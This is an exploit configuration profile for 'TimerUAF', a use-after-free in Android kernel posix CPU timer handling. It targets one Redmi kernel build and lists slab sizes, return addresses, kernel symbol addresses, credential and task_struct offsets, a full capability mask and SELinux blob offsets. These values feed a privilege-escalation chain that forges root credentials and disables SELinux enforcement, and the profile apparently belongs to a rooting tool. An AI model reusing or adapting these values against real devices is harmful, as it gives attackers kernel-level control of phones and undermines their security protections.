# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Redmi Note 17 Pro Max (brussels)
# Kernel: 6.12.69-android16-6-g586bfab1b9c5-abogki537510563-4k (4K pages)
#
# Every constant below is derived from that factory boot.img:
#   init_posix_timers  kmem_cache_create("posix_timers_cache", 0x100, 0,
#                      SLAB_PANIC|SLAB_ACCOUNT) -> timer_alloc 0x100
#   alloc_posix_timer  bl kmem_cache_alloc_noprof at 0xffffffc080579aa0,
#                      returns to 0xffffffc080579aa4 (x0 = posix_timers_cache)
#   copy_process       bl kmem_cache_alloc_node_noprof at
#                      0xffffffc080194770, returns to 0xffffffc080194774
#                      (x0 = task_struct_cachep); low21 0x194774
#   arch_task_struct_size = sizeof(task_struct) 0x1440 + 0x200 from
#                      android_arch_task_struct_size=512 in the dtb
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers().
release = "6.12.69-android16-6-g586bfab1b9c5-abogki537510563-4k"
schema_version = 1
ksu_kmi = "android16-6.12"

page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# alloc_posix_timer -> kmem_cache_alloc_noprof(posix_timers_cache)
timer_site = 0xffffffc080579aa4
timer_alloc = 0x100
# The `it` union (k_itimer.it) is at +0x78; its `cpu` member is a
# struct cpu_timer, whose first field `node` is at +0, so the timerqueue
# rb_node sits at +0x78.
timer_node_off = 0x78

# cred_jar: sizeof(struct cred)=0xb8 (BTF), SLAB_HWCACHE_ALIGN -> 0xc0
cred_req = 0xb8
cred_alloc = 0xc0
cred_size = 0xb8
cred_uid_off = 0x8
cred_euid_off = 0x18
cred_cap_off = 0x30
cred_cap_count = 5
cred_security_off = 0x80
cred_user_off = 0x88
cred_userns_off = 0x90
cred_ucounts_off = 0x98
cred_group_off = 0xa0
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffffc08289abc8
panic_on_warn = 0xffffffc0825eade0

# task_struct / cred layout (BTF)
task_cred_off = 0x900
copy_process_low21 = 0x194774
# 0x1440 (BTF sizeof task_struct) + 0x200 (bootconfig vendor extension)
task_alloc_bytes = 0x1640

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc0826121f0
init_user_ns = 0xffffffc082611f78
init_ucounts = 0xffffffc082613b88
init_groups = 0xffffffc0826136b8

# task_security_struct
# Runtime CONFIG_LSM order is
#   landlock,lockdown,yama,loadpin,safesetid,selinux,smack,tomoyo,apparmor,ipe,bpf
# so the aggregate cred blob lays out landlock[0x0..0x8) then selinux[0x8..).
selinux_blob_off = 0x8
selinux_sid_kernel = 1
